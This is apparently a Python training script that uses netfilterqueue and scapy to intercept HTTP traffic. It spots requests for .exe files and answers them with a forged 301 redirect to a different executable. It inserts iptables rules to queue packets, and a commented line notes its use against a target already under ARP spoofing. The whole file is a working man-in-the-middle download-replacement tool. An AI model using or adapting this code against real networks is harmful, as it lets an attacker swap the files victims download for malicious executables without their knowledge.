import netfilterqueue
import subprocess
import scapy.all as scapy

ack_list=[]
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Wraps the packet payload into the IP layer of a scapy packet. The scapy packet will have complete info though with all layers.
    if scapy_packet.haslayer(scapy.Raw): # All the useful data is present in the RAW layer
        if scapy_packet[scapy.TCP].dport == 80: # Dest port. Will use 80 instead of "http"
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("[+] Exe request detected")
                ack_list.append(scapy_packet[scapy.TCP].ack) # Store the ack fields for packets containing exe requests
        elif scapy_packet[scapy.TCP].sport == 80: # Source port
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-600am.exe\n\n" # Note the format
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()

try:
    subprocess.call("service apache2 start", shell=True)
    #subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # Create a modified IP table. For spoofing on a target with mac already spoofed
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True) # Create a modified IP table. For spoofing on our own computer
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True) # Create a modified IP table. For spoofing on our own computer
    queue = netfilterqueue.NetfilterQueue() # Creating an object
    queue.bind(0, process_packet) # Will bind this queue to the queue we created:  queue-num-0
    # process_packet function will be called for each packet which gets trapped in the queue
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True) # Delete the IP table we created
    print("[-] IP tables flushed")